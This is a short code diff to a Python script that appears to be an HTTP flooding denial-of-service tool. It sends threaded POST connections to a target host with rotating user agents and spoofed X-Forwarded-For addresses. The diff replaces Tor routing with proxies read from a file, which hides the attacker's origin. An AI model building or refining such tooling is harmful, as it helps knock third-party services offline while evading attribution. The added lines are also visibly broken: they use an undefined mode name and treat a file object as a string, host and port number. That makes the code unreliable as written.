@@ -49,6 +49,9 @@ useragents = [
  "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
 ]
 
+f = open("proxies.txt", r)
+f.read()
+
 def random_ipv4():
     return '.'.join(str(randint(0,255)) for _ in range(4))
 
@@ -68,7 +71,7 @@ class httpPost(Thread):
                         "Host: %s\r\n"
                         "User-Agent: %s\r\n"
                         "X-Forwarded-For: %s\r\n\r\n" % 
-                        (self.host, random.choice(useragents), random_ipv4()))
+                       (self.host, random.choice(useragents), f))
 
         for i in range(0, 9999):
             if stop_now:
@@ -83,7 +86,7 @@ class httpPost(Thread):
             while self.running:
                 try:
                     if self.tor:     
-                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+                        self.socks.setproxy(socks.PROXY_TYPE_HTTP, f, int(f.strip()))
                     self.socks.connect((self.host, self.port))
                     print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                 except:
